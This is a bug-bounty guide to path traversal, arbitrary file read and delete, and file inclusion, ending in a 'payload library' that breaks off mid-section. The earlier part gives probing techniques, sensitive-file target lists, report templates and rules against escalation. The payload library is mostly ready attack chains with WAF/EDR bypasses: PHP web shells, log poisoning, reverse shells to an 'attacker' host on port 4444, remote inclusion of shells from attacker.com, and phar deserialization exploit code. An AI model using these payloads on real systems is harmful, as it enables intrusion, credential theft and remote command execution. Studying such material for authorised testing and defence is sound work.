# Path Traversal / Arbitrary File Read / Arbitrary File Delete

> Perspective: black-box; the goal is to read files you shouldn't read / delete files you shouldn't delete

## 1. In one sentence

Path traversal = a user-controlled file path bypasses the application's "directory boundary."
The most classic: `?file=../../etc/passwd`.
SRC value: being able to read = P1, reading config → DB password → P0; arbitrary file delete = P0 (**easily overlooked**).

---

## 2. High-frequency entry points

### 2.1 High-risk parameter names (by wooyun case frequency)

| Parameter | Occurrences | Typical scenario |
|------|---------|---------|
| `filename` | 63 | file download / attachment |
| `filepath` | 30 | path specification |
| `path` | 20 | generic path |
| `hdfile` | 14 | specific CMS |
| `inputFile` | 9 | Resin / Java |
| `file` | 7 | generic |
| `url` | 4 | SSRF / file-read composite |
| `filePath` | 4 | Java camelCase |
| `FileUrl` | 3 | ASP.NET |
| `XFileName` | 3 | specific CMS |

### 2.2 Parameter naming patterns

```
Generic: file, path, name, url, src, dir, folder
Download: download, down, attachment, attach, doc
Read: read, load, get, fetch, open, input
File: filename, filepath, fname, fn, resource
Template: template, tpl, page, include, temp
```

Composite parameters:
```
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
```

### 2.3 Top high-frequency vulnerable endpoints

```
down.php           (20 times)
download.jsp       (17 times)
download.asp       (13 times)
download.php       (7 times)
download.ashx      (7 times)
viewsharenetdisk.php (6 times)
GetPage.ashx       (6 times)
pic.php            (4 times)
openfile.asp       (4 times)
do_download.jsp    (8 times)
```

---

## 3. Probing techniques

### 3.1 Basic traversal sequences

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
```

### 3.2 Encoding gradient (try in order)

```
../        →  %2e%2e%2f
../        →  %252e%252e%252f                # double URL encoding
../        →  ..%c0%af / ..%c1%9c            # overlong UTF-8 (Tomcat / GlassFish)
../        →  %u002e%u002e%u2215             # 16-bit Unicode (IIS / old Java)
../        →  ....// / ..../                  # leaves ../ after the filter strips once
../        →  ..%2f%2e / %2e%2e/              # mixed
```

### 3.3 Truncation / protocols

```
%00       ../../../etc/passwd%00.jpg       # PHP <5.3.4 / old Java
;         /admin;.jpg                       # IIS / Tomcat
file://   file:///etc/passwd
view-source:  view-source:file:///etc/passwd
php://filter  php://filter/convert.base64-encode/resource=index.php
zip://    zip://archive.zip%23shell.php
data://   data://text/plain,<?php phpinfo();?>
expect:// expect://id
```

### 3.4 Path-normalization bypass

```
....//      # double-dot slash
..../       # multi-dot
..\..\      # backslashes
..\../      # mixed
/./         # redundant
//          # double slash
/;/         # semicolon path segment
```

### 3.5 Base64 / Hex bypass

```
# Winmail case
?filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
(base64 decode = ../../../../../../windows/win.ini)

# Taoke Empire CMS
?url=cGljLnBocA==
(base64 = pic.php)
```

### 3.6 Sensitive-file target library

#### Linux

```
# System accounts
/etc/passwd                /etc/shadow
/etc/hosts                 /etc/group
/etc/sudoers               /etc/issue

# SSH
/root/.ssh/authorized_keys     /root/.ssh/id_rsa
/home/{user}/.ssh/authorized_keys
/home/{user}/.ssh/id_rsa

# History / processes (information gold mine)
/root/.bash_history
/home/{user}/.bash_history
/proc/self/environ          # contains process startup environment variables (with secrets)
/proc/self/cmdline
/proc/self/fd/{n}
/proc/version               /proc/cpuinfo
/proc/{pid}/environ

# Web config
/etc/nginx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/my.cnf                 /etc/mysql/my.cnf
```

#### Windows

```
C:\windows\win.ini          C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\drivers\etc\hosts
```

#### Java Web

```
/WEB-INF/web.xml
/WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.properties
/WEB-INF/classes/applicationContext.xml
/WEB-INF/classes/hibernate.cfg.xml
/WEB-INF/classes/application.yml
../WEB-INF/web.xml
../../WEB-INF/web.xml
/../WEB-INF/web.xml%3f
```

#### PHP / frameworks

```
/config.php           /config.inc.php
/db.php               /database.php
/conn.php             /common.php
/wp-config.php        # WordPress
/config_global.php    # Discuz
/config_ucenter.php   # Discuz UCenter
/application/config/database.php   # CodeIgniter
/config/database.php  # Laravel
/.env                 /.env.production
```

#### .NET

```
/web.config
/connectionStrings.config
/App_Data/database.mdf
```

### 3.7 Probe strategy

```bash
# Standard 8-12 levels of ../
for i in 1 2 3 4 5 6 7 8 9 10; do
  prefix=$(printf '../%.0s' $(seq 1 $i))
  curl -s "https://target/down.php?file=${prefix}etc/passwd" \
    | grep -q "root:" && echo "Hit: $i levels"
done

# Incremental encoding
for enc in "../" "..%2f" "%2e%2e%2f" "%252e%252e%252f" "..%c0%af" "....//"; do
  curl -s "https://target/down.php?file=${enc}${enc}${enc}etc/passwd"
done

# Java Web patterns
curl "https://target/download.jsp?path=../WEB-INF/web.xml"
curl "https://target/download.aspx?file=../web.config"
```

---

## 4. Bypass matrix

| Blocked by | Bypass |
|---|---|
| `../` literal blocking | URL encoding / double encoding / Unicode overlong / `....//` / `..\../` |
| Suffix allowlist (`.jpg`) | `%00` truncation / `?file=../../etc/passwd%00.jpg` / `;.jpg` |
| Blacklist `passwd` | `pas%73wd` / `passwD` / `pas\x73wd` (old versions) |
| Absolute path blocking | relative path + many `../` |
| Multiple `../` blocking | nesting: `....//` leaves `../` after stripping once |
| Keyword `etc` | `EtC` / `e%74c` / fully encoded |
| Only a certain directory allowed | exploit normalization differences: `/allowed/../etc/passwd` |
| Length limit | short files: `/etc/hosts` is shorter than `/etc/passwd` |

---

## 5. Exploitation for escalation / lateral

```
Read /etc/passwd → obtain a list of usernames
  ↓
Read /home/web/.ssh/id_rsa → SSH private key (do not use it)
  ↓
Read application.yml / .env → DB / Redis / API keys
  ↓
Read /proc/self/environ → startup environment variables (with secrets)
  ↓
Read /WEB-INF/classes/jdbc.properties → JDBC connection string

→ When reporting to SRC, it is **best to stop at "config file + first line of content (redacted)"**
  Do not attempt to log into any service with the obtained keys

# Arbitrary file delete → cripple the service
DELETE /api/upload?path=../../web/index.html → the homepage disappears
```

Reference wooyun cases:
- `?urlParam=../../../WEB-INF/web.xml%3f` (Huayun Data, config disclosure)
- `upload.aspx?id=8&dir=../../../../` (an appliance manufacturer, directory browsing + arbitrary delete)
- `down.php?dd=../down.php` (a government site, source download)
- `IP:8888/../../../etc/shadow` (a large vendor's internal, shadow read)

---

## 6. Real-case fingerprints

| Case ID | Payload | Result |
|--------|---------|------|
| wooyun-Huayun Data | `?urlParam=../../../WEB-INF/web.xml%3f` | config disclosure |
| wooyun-an appliance vendor | `upload.aspx?id=8&dir=../../../../` | directory browsing + arbitrary delete |
| wooyun-a government site | `down.php?dd=../down.php` | source download |
| wooyun-Shanghai Maritime | `/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/.../etc/passwd` | overlong UTF-8 (GlassFish) |
| Resin | `/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd` | absolute path |
| Winmail | `?filename={base64 of ../../../windows/win.ini}` | base64 bypass |
| Taoke Empire | `pic.php?url=cGljLnBocA==` | base64 |

Common fingerprints:

- `root:x:0:0:root:/root:/bin/bash` in the response → hit /etc/passwd
- `[boot loader]` or `[fonts]` in the response → win.ini
- `<?xml version="1.0"` + `<web-app` in the response → web.xml
- `connectionString=` in the response → web.config
- `;application.properties` fields in the response → Spring Boot config

---

## 7. Reproduction / evidence essentials

### 7.1 Report must-haves

1. Full request URL
2. Response status + key content
3. First line of the read file / key marker fields (**redacted**)
4. Impact escalation chain (e.g. if you can read the DB password, but do not actually use it)

### 7.2 PoC template

```http
GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... (first 5 lines as proof, the rest redacted)
```

### 7.3 Config-file class (high value, must redact)

```http
GET /download?file=../../config/application-prod.yml HTTP/1.1
...

HTTP/1.1 200 OK

spring:
  datasource:
    url: jdbc:mysql://10.0.x.x:3306/****
    username: ****
    password: M****d! (13 chars)
    driver-class-name: com.mysql.cj.jdbc.Driver
  redis:
    host: 10.0.x.x
    password: r****x (10 chars)

I stopped at the "reading this config" step and did not attempt to connect with any credentials.
Full file sha256: abc123... (proving the original was obtained)
```

### 7.4 CVSS

```
Arbitrary file read (incl. sensitive)  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
Reading public content only            CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
Read DB config → chain to P0 = 9.8
Arbitrary file delete                  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H = 8.6
Arbitrary file overwrite (webroot)     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

### 7.5 Impact section

```
Via the file parameter of the /download.php endpoint, an attacker can use ../ sequences to read
arbitrary files. Confirmed readable:
1. /etc/passwd (system user list)
2. /var/www/html/config/application-prod.yml (DB / Redis credentials)
3. /proc/self/environ (startup environment variables)

Most severe chain:
  arbitrary file read → application-prod.yml → MySQL password → direct database connection
(I stopped at the "read the yml" step and did not attempt to connect to the DB)

Tested 5 times, 100% reproduction rate.
```

---

## 8. Things not to do

- **Forbidden**: logging into any service with an obtained SSH private key / DB password.
- **Forbidden**: reading `/etc/shadow` (even if you can, it will raise suspicion of crossing the line). Only prove the "read capability"; stop as soon as you see a `root:x:` line.
- **Forbidden**: bulk-reading multiple users' `.bash_history` / `.aws/credentials`. Prove only 1 sample.
- **Forbidden**: attempting arbitrary file deletion of real production files (`index.html`, `.htaccess`). Validate in a test environment / create a PoC file in the affected directory and delete that.
- **Forbidden**: uploading the read source code / config to GitHub / third-party repositories. Store locally and delete after reporting.
- **In the report**: source code / config must be redacted. You may attach a sha256 hash to prove you obtained the original.

## H1 real cases

_A total of 163 disclosed HackerOne High/Critical reports hit this category, sorted by (bounty + votes×100), taking the Top 12_

| Severity | $ | Program | Title (click for the original report) | Summary |
|---|--:|---|---|---|
| Critical | 20000 usd | GitLab | [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) | Summary The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal wh… |
| Critical | 29000 usd | GitLab | [Arbitrary file read  via the bulk imports UploadsPipeline](https://hackerone.com/reports/1439593) | Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be rea… |
| Critical | 16000 usd | GitLab | [Arbitrary file read during project import](https://hackerone.com/reports/1132378) | NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remem… |
| Critical | — | Starbucks | [Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted …](https://hackerone.com/reports/876295) | Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data |
| High | 6000 usd | Mozilla | [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) | Summary: Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all … |
| High | 12000 usd | GitLab | [Path traversal in Nuget Package Registry](https://hackerone.com/reports/822262) | Summary There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently |
| High | — | LY Corporation | [Path traversal in filename in LINE Mac client](https://hackerone.com/reports/727727) | Path traversal in filename in LINE Mac client |
| Critical | — | WordPress | [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) | This vulnerability was found when I found myself in the following scenario: My collegue set up WordPress on his local machine a… |
| High | — | PortSwigger Web Security | [[portswigger.net] Path Traversal al /cms/audioitems](https://hackerone.com/reports/2424815) | Prelude. I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real. Description… |
| Critical | 4000 usd | Internet Bug Bounty | [Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49](https://hackerone.com/reports/1394916) | A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 |
| High | — | Lichess | [Path Traversal Vulnerability in Lila Project](https://hackerone.com/reports/3181066) | Summary: A path traversal vulnerability was discovered in the Lila project that allows an attacker to access arbitrary files on… |
| High | 1000 usd | Aiven Ltd | [Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file …](https://hackerone.com/reports/1415820) | Summary: Hi team, I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms |

**Weakness distribution for hits in this category:**

- Path Traversal: 144 entries
- Uncategorized → manually classified: 7 entries
- Path Traversal: '.../...//': 5 entries
- Relative Path Traversal: 2 entries
- External Control of File Name or Path: 1 entry
- File Manipulation: 1 entry
- PHP Local File Inclusion: 1 entry
- Untrusted Search Path: 1 entry
- Insecure Temporary File: 1 entry

## Payload library

_12 structured web payloads, including full attack chains + WAF/EDR bypass variants_

### Local file inclusion  `lfi-basic`
Local file inclusion exploitation techniques
Sub-category: **local inclusion** · tags: `lfi` `local` `file` `inclusion`

**Prerequisites:** a file-inclusion feature exists; the user can control the inclusion path

**Attack chain:**

**1. 1. Probe LFI**
_Probe local file inclusion_
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```

**2. 2. Read sensitive files**  _[linux]_
_Read Linux sensitive files_
```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```

**3. 3. PHP pseudo-protocols**
_Use PHP pseudo-protocols_
```
php://filter/convert.base64-encode/resource=config.php
php://input (POST data as input)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```

**4. 4. Log poisoning**  _[linux]_
_Achieve RCE via log poisoning_
```
1. Include the log file: ../../../var/log/apache2/access.log
2. Inject into User-Agent: <?php system($_GET['c']); ?>
3. Access: ?file=../../../var/log/apache2/access.log&c=id
```

**WAF/EDR bypass variants:**

**1. Directory-traversal bypass**
_Bypass directory-traversal filtering_
```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```

**2. Suffix bypass**
_Bypass file-suffix checks_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```

---

### Remote file inclusion  `rfi-basic`
Remote file inclusion exploitation techniques
Sub-category: **remote inclusion** · tags: `rfi` `remote` `file` `inclusion`

**Prerequisites:** a file-inclusion feature exists; allow_url_include=On; the user can control the inclusion path

**Attack chain:**

**1. 1. Probe RFI**
_Probe remote file inclusion_
```
?file=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt%00
?file=http://attacker.com/shell.txt?
```

**2. 2. Host a malicious file**
_Host a malicious file and execute it_
```
# shell.txt content
<?php system($_GET['cmd']); ?>

# Access
?file=http://attacker.com/shell.txt&cmd=id
```

**3. 3. Reverse shell**  _[linux]_
_Obtain a reverse shell_
```
# shell.txt content
<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Or use
<?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**4. 4. Use the data protocol**
_Use the data protocol to execute code_
```
?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

**WAF/EDR bypass variants:**

**1. Double-write bypass**
_Double-write bypass of keyword filtering_
```
?file=htthttp://p://attacker.com/shell.txt
?file=http://attackerattacker.com.com/shell.txt
```

**2. Case obfuscation**
_Case obfuscation bypass_
```
?file=HtTp://attacker.com/shell.txt
?file=HTTP://attacker.com/shell.txt
```

**3. Protocol substitution**
_Use other protocols_
```
?file=ftp://attacker.com/shell.txt
?file=php://filter/convert.base64-encode/resource=http://attacker.com/shell.txt
```

---

### Log-poisoning LFI  `lfi-log-poison`
Achieve LFI-to-RCE via log poisoning
Sub-category: **log poisoning** · tags: `lfi` `log` `poison` `rce`

**Prerequisites:** an LFI vulnerability exists; the log file can be included; the log file is writable

**Attack chain:**

**1. 1. Probe log file locations**  _[linux]_
_Probe log file locations_
```
# Apache logs
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log
../../../var/log/httpd/access_log
../../../var/log/nginx/access.log

# System logs
../../../var/log/auth.log
../../../var/log/syslog
```

**2. 2. Poison the User-Agent**
_Inject code into the User-Agent_
```
# Poison using curl
curl -A "<?php system($_GET['c']); ?>" http://target.com/

# Or use Burp Suite to modify the User-Agent
User-Agent: <?php system($_GET['c']); ?>
```

**3. 3. Poison the request path**
_Inject code into the request path_
```
# Inject into the URL path
curl http://target.com/<?php system($_GET['c']); ?>

# URL encoding
curl http://target.com/%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E
```

**4. 4. Execute commands**  _[linux]_
_Include the log file to execute commands_
```
# Include the log file and execute commands
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/apache2/access.log&c=whoami
?file=../../../var/log/apache2/access.log&c=cat /etc/passwd
```

**5. 5. Reverse shell**  _[linux]_
_Obtain a reverse shell_
```
?file=../../../var/log/apache2/access.log&c=bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"
```

**WAF/EDR bypass variants:**

**1. Encoding bypass**
_WAF bypass technique_
```
# Use Base64 encoding
<?php eval(base64_decode($_GET['c'])); ?>
# Then pass a Base64-encoded command
```

---

### PHP pseudo-protocol exploitation  `lfi-wrapper`
Use PHP pseudo-protocols for LFI attacks
Sub-category: **pseudo-protocol** · tags: `lfi` `wrapper` `php` `protocol`

**Prerequisites:** an LFI vulnerability exists; a PHP environment; pseudo-protocols not disabled

**Attack chain:**

**1. 1. php://filter**
_Use php://filter to read source code_
```
# Read source code (Base64)
?file=php://filter/convert.base64-encode/resource=config.php

# Read source code (Rot13)
?file=php://filter/read=string.rot13/resource=config.php

# Multiple filters
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php
```

**2. 2. php://input**
_Use php://input to execute code_
```
# Execute PHP code via POST
?file=php://input
POST: <?php system('id'); ?>

# Execute arbitrary code
POST: <?php phpinfo(); ?>
POST: <?php echo file_get_contents('/etc/passwd'); ?>
```

**3. 3. data:// protocol**
_Use the data:// protocol to execute code_
```
# Execute code directly
?file=data://text/plain,<?php system('id'); ?>

# Base64 encoding
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Execute arbitrary commands
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
```

**4. 4. phar:// protocol**
_Use the phar:// protocol_
```
# Create a phar file
<?php
$p = new Phar('shell.phar');
$p->addFromString('shell.txt', '<?php system($_GET["c"]); ?>');
?>

# Include the phar
?file=phar://shell.phar/shell.txt&c=id
```

**5. 5. zip:// protocol**
_Use the zip:// protocol_
```
# Create a zip file
zip shell.zip shell.txt
# shell.txt content: <?php system($_GET['c']); ?>

# Include the zip
?file=zip://shell.zip%23shell.txt&c=id

# Use jpg+zip
copy shell.jpg+shell.zip shell.jpg
?file=zip://shell.jpg%23shell.txt&c=id
```

**WAF/EDR bypass variants:**

**1. Case obfuscation**
_Case obfuscation bypass_
```
?file=Php://filter/convert.base64-encode/resource=config.php
?file=DATA://text/plain,<?php system('id'); ?>
```

**2. Double URL encoding**
_Double URL encoding bypass_
```
?file=php%3A%2F%2Ffilter/convert.base64-encode/resource=config.php
?file=%70%68%70%3a%2f%2finput
```

---

### Directory-traversal techniques  `lfi-traversal`
LFI directory-traversal bypass techniques
Sub-category: **directory traversal** · tags: `lfi` `traversal` `bypass` `path`

**Prerequisites:** an LFI vulnerability exists; path filtering exists

**Attack chain:**

**1. 1. Basic traversal**
_Basic directory traversal_
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```

**2. 2. Bypass ../ stripping**
_Bypass filters that strip ../_
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```

**3. 3. URL encoding bypass**
_URL encoding bypass_
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**4. 4. Unicode encoding bypass**
_Unicode encoding bypass_
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**5. 5. Absolute-path bypass**
_Use an absolute path_
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```

**WAF/EDR bypass variants:**

**1. Mixed encoding**
_Mixed-encoding bypass_
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**2. Null-byte truncation**
_Null-byte truncation to bypass suffix_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

**3. Dot truncation (Windows)**  _[windows]_
_Windows dot truncation_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```

---

### PHP filter chain attack  `lfi-php-filter`
Use PHP filter chains for LFI attacks
Sub-category: **PHP Filter** · tags: `lfi` `php` `filter` `chain`

**Prerequisites:** an LFI vulnerability exists; a PHP environment; the filter pseudo-protocol is available

**Attack chain:**

**1. 1. Read source code**
_Use Filter to read source code_
```
# Read via Base64 encoding
?file=php://filter/convert.base64-encode/resource=index.php

# Read via Rot13
?file=php://filter/read=string.rot13/resource=index.php

# Character conversion
?file=php://filter/read=string.toupper/resource=index.php
```

**2. 2. Multiple filters**
_Use multiple filters_
```
# Multiple encodings
?file=php://filter/convert.base64-encode|string.rot13/resource=config.php

# Strip PHP tags
?file=php://filter/read=string.strip_tags/resource=index.php
```

**3. 3. Filter-chain RCE**
_Use advanced filters_
```
# Use the iconv filter
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Use zlib compression
?file=php://filter/zlib.deflate/resource=index.php
?file=php://filter/zlib.inflate/resource=data
```

**4. 4. Read config files**
_Read common framework configs_
```
# WordPress config
?file=php://filter/convert.base64-encode/resource=wp-config.php

# Laravel .env
?file=php://filter/convert.base64-encode/resource=../.env

# ThinkPHP config
?file=php://filter/convert.base64-encode/resource=application/database.php
```

**WAF/EDR bypass variants:**

**1. Case obfuscation**
_Case obfuscation bypass_
```
?file=PHP://FILTER/CONVERT.BASE64-ENCODE/RESOURCE=config.php
?file=PhP://FiLtEr/convert.base64-encode/resource=config.php
```

**2. Encoding bypass**
_URL encoding bypass_
```
?file=%70%68%70%3a%2f%2f%66%69%6c%74%65%72/convert.base64-encode/resource=config.php
```

---

### PHP Input execution  `lfi-php-input`
Use php://input to execute PHP code
Sub-category: **PHP Input** · tags: `lfi` `php` `input` `rce`

**Prerequisites:** an LFI vulnerability exists; allow_url_include=On; the POST method is available

**Attack chain:**

**1. 1. Basic execution**
_Use php://input to execute code_
```
# GET request
GET ?file=php://input

# POST data
POST: <?php system('id'); ?>
POST: <?php echo 'Hello'; ?>
```

**2. 2. Command execution**
_Execute system commands_
```
# Execute a system command
POST: <?php system($_GET['c']); ?>
# Then access: ?file=php://input&c=id

# Use exec
POST: <?php echo exec('id'); ?>

# Use shell_exec
POST: <?php echo shell_exec('id'); ?>
```

**3. 3. File operations**
_File operations_
```
# Read a file
POST: <?php echo file_get_contents('/etc/passwd'); ?>

# Write a file
POST: <?php file_put_contents('shell.php', '<?php system($_GET["c"]); ?>'); ?>

# List a directory
POST: <?php print_r(scandir('.')); ?>
```

**4. 4. Reverse shell**  _[linux]_
_Obtain a reverse shell_
```
POST: <?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Or use
POST: <?php $sock=fsockopen("attacker",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

**WAF/EDR bypass variants:**

**1. Encoding bypass**
_Use encoding to bypass_
```
# Base64 encoding
POST: <?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
# Decoded: system($_GET['c']);

# Rot13 encoding
POST: <?php eval(str_rot13('flfgrz($_TRG['p']);')); ?>
```

**2. Short tags**
_WAF bypass technique_
```
POST: <?=system($_GET['c']);?>
POST: <?=`$_GET[c]`?>
```

---

### PHP Data protocol attack  `lfi-php-data`
Use the data:// protocol to execute PHP code
Sub-category: **PHP Data** · tags: `lfi` `php` `data` `protocol`

**Prerequisites:** an LFI vulnerability exists; allow_url_include=On; the data protocol is available

**Attack chain:**

**1. 1. Basic execution**
_Use the data:// protocol to execute code_
```
# Execute directly
?file=data://text/plain,<?php system('id'); ?>

# Execute phpinfo
?file=data://text/plain,<?php phpinfo(); ?>

# Output text
?file=data://text/plain,Hello World
```

**2. 2. Base64 encoding**
_Use Base64 encoding_
```
# Execute via Base64 encoding
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
# Decoded: <?php system('id'); ?>

# Execute with a parameter
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id
```

**3. 3. Command execution**
_Execute system commands_
```
# Interactive command
?file=data://text/plain,<?php system($_GET['c']); ?>&c=id
?file=data://text/plain,<?php system($_GET['c']); ?>&c=whoami
?file=data://text/plain,<?php system($_GET['c']); ?>&c=cat /etc/passwd
```

**4. 4. Reverse shell**  _[linux]_
_Obtain a reverse shell_
```
?file=data://text/plain,<?php system("bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\""); ?>

# Base64 version
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci80NDQ0IDA+JjFcIiIpOyA/Pg==
```

**WAF/EDR bypass variants:**

**1. Case obfuscation**
_Case obfuscation bypass_
```
?file=DATA://TEXT/PLAIN,<?php system('id'); ?>
?file=Data://Text/Plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

**2. URL encoding**
_URL encoding bypass_
```
?file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e
```

**3. MIME-type variation**
_Vary the MIME type_
```
?file=data://text/html,<?php system('id'); ?>
?file=data://application/x-httpd-php,<?php system('id'); ?>
```

---

### PHP Zip protocol attack  `lfi-php-zip`
Use the zip:// protocol for LFI attacks
Sub-category: **PHP Zip** · tags: `lfi` `php` `zip` `archive`

**Prerequisites:** an LFI vulnerability exists; a zip file can be uploaded; the zip protocol is available

**Attack chain:**

**1. 1. Create a malicious Zip**
_Create a malicious Zip file_
```
# Create shell.txt
echo '<?php system($_GET["c"]); ?>' > shell.txt

# Create the zip file
zip shell.zip shell.txt

# Or use Python
import zipfile
with zipfile.ZipFile('shell.zip', 'w') as z:
    z.writestr('shell.txt', '<?php system($_GET["c"]); ?>')
```

**2. 2. Upload the Zip file**
_Upload the Zip file_
```
# Upload shell.zip via a file-upload feature
# Or upload by other means

# Remember the upload path
/uploads/shell.zip
```

**3. 3. Include the Zip file**
_Include the Zip file to execute code_
```
# Include using the zip:// protocol
?file=zip://uploads/shell.zip%23shell.txt&c=id

# %23 is the URL encoding of #
# Format: zip://path#filename
```

**4. 4. Image-embedded shell**
_Upload using an image-embedded shell_
```
# Create an image-embedded shell
copy image.jpg+shell.zip image.jpg

# Or use
cat image.jpg shell.zip > image.jpg

# Include
?file=zip://uploads/image.jpg%23shell.txt&c=id
```

**WAF/EDR bypass variants:**

**1. Use phar://**
_Use the phar:// protocol_
```
?file=phar://uploads/shell.zip/shell.txt&c=id
# phar:// can also access zip files
```

**2. Nested archives**
_Nested-archive bypass_
```
# Nest a zip inside a zip
zip inner.zip shell.txt
zip outer.zip inner.zip

# Include
?file=zip://outer.zip%23inner.zip%23shell.txt&c=id
```

---

### Phar deserialization attack  `lfi-phar`
Use Phar deserialization for RCE
Sub-category: **Phar deserialization** · tags: `lfi` `phar` `deserialization` `rce`

**Prerequisites:** an LFI vulnerability exists; a PHP environment; the phar extension is available

**Attack chain:**

**1. 1. Create a Phar file**
_Create a malicious Phar file_
```
# Create a malicious Phar
<?php
class Exploit {
    function __destruct() {
        system($_GET['c']);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$o = new Exploit();
$phar->setMetadata($o);
$phar->stopBuffering();
?>
```

**2. 2. Trigger deserialization**
_Trigger Phar deserialization_
```
# Trigger via file_exists
?file=phar://exploit.phar&c=id

# Trigger via file_get_contents
?file=phar://exploit.phar/test.txt&c=id

# Trigger via include
?file=phar://exploit.phar&c=id
```

**3. 3. Image-embedded Phar**
_Use an image-embedded Phar_
```
# Create an image Phar
copy exploit.phar exploit.gif

# Or add a GIF header
cp exploit.phar exploit.gif

# Trigger
?file=phar://uploads/exploit.gif&c=id
```

**4. 4. Common gadget chains**
_Use common gadget chains_
```
# Laravel POP chain
# Symfony POP chain
# WordPress POP chain
# ThinkPHP POP chain

# Generate with phpggc
git clone https://github.com/ambionics/phpggc
php phpggc Laravel/RCE1 system id > exploit.phar
```

**WAF/EDR bypass variants:**

**1. Base64 encoding**
_Base64 encoding bypass_
```
# Base64-encode the Phar content
# Then decode and trigger
```

**2. Pseudo-protocol combination**
_Pseudo-protocol combination_
```
